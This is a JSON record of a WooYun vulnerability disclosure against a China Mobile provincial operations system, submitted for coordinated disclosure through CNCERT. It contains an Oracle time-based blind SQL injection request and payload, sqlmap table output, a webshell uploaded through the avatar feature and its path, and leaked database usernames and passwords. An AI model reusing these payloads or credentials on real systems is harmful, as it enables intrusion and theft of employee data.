{"id": 85667, "wybug_id": "wooyun-2016-0173128", "wybug_title": "中国移动某省运维系统从盲注到getshell(大量员工/基础设备/可提权内网)", "wybug_corp": "中国移动", "wybug_author": "路人甲", "wybug_date": "2016-01-27 20:10", "wybug_open_date": "2016-03-14 14:25", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "管理后台对外", "时间盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-14：\t细节向公众公开  简要描述： 盲注真慢 详细说明：  http://\n\nmask 区域\n1.://**.**.**/NMMP/\n\n忘记密码处mobile=oracle时间盲注\nPOST /NMMP/resetpwdAction!checkAccountAndMobile.ilf HTTP/1.1Host: \n\nmask 区域\n\n1.://**.**.**\n\n\n\nProxy-Connection: keep-aliveContent-Length: 23Origin: http://\n\n\n\nmask 区域\n\n1.://**.**.**\n\n\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Accept: */*Referer: <mask/>http://**.**.**.**:7010</mask>/NMMP/resetpwdAction.ilfAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=NSsNWldCX2SPj5dWsY9bkvGQZymFkQcy8yCnZGbZGTvYvBns91G1!-1030327823mobile=111*&account=root\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: mobile (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: mobile=111' AND 5010=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(110)||CHR(113)||CHR(115),5) AND 'aGPk'='aGPk&account=root---web application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: OracleDatabase: AUTHDB[51 tables]+----------------------+| RESOURCETYPE        || AUTHORITYOPTION      || AUTHORITYRULE        || CITY                 || CITY_AREA            || CMP_TEMP             || COMPANY              || COUNTRY              || DW_ROLE              || EMPLEVEL             || EMPLOYEE             || EMPLOYEE_20150330    || FUNCTIONS            || FUNCTIONS3           || FUNCTYPE             || GROUPFUNC            || GROUPROLE            || GRPMEMBER            || LOGINLOG             || OPERATIONLOG         || PASSWORDHISTORY      || ROLEFUNC             || ROLEFUNC0830         || ROLEINHERITA         || ROLES                || SSO_ACCOUNTCODE      || SSO_ACCOUNTMAP       || SSO_DOMAINAPP        || SSO_STRATEGIES       || TAOCI                || TEST_DW              || TEST_ZW              || T_APP_USE_2          || T_APP_USE_3          || T_BPM_USERINFO       || T_PLT_LOGIN          || T_PLT_LOGINCITYDW_TG || T_PLT_LOGINDW_TG     || T_PLT_LOGIN_3        || UNIT                 || UNIT_20150330        || UNIT_YY              || USERBACK             || USERFUNC             || USERFUNC_BAK         || USERGROUP            || USERINFO             || USERINFO_20150330    || USERINFO_TEMP        || USERROLE             || USERXINXI            |+----------------------+\nUSERINFO字段测试账号：\n\nmask 区域\n*****gui/HNd*****\n\n\n\n\n\ngetshell人员变更->上传头像 weblogic低版本 直接大马\n\n可连数据库 拿到管理员账号   1万多个员工密码泄露和信息\n\nmask 区域\n*****ins*****\n\n登录系统\n\n\n\n\n\nhttp://\n\nmask 区域\n1.://**.**.**/handtask/\n\n 账号密码和代维系统互通测试\n\nmask 区域\n*****gui/HNd*****\n\n大量内网地址\n\n\n\n   漏洞证明：  \n\n\njdbc.driverClassName=oracle.jdbc.driver.OracleDriver#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:orcljdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:zhjk#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:ossoradb2jdbc.username=GZ_BSSjdbc.password=GZ_BSS\n\n#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:gstsora#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:orcl#jdbc.username=tmn#jdbc.password=tmn123#jdbc.password=tmn@lc#jdbc.username=custcare_gsyd#jdbc.password=custcarejdbc.driverClassName=oracle.jdbc.driver.OracleDriver#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:orcljdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:netmaintain#jdbc.url=jdbc:oracle:thin:@**.**.**.**:1521:netmaintainjdbc.username=NETMAINTAINjdbc.password=NETMAINTAIN\n   修复方案：  1.修复前台忘记密码处注入2.后台搜索处还有时间盲注自查3.头像处上传文件getshellwebshell:http://\n\nmask 区域\n1.://**.**.**\n\n/NMMP/upload/qualification/employee/photo/201601271516367583044.jsp   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-29 14:49 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理部门处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}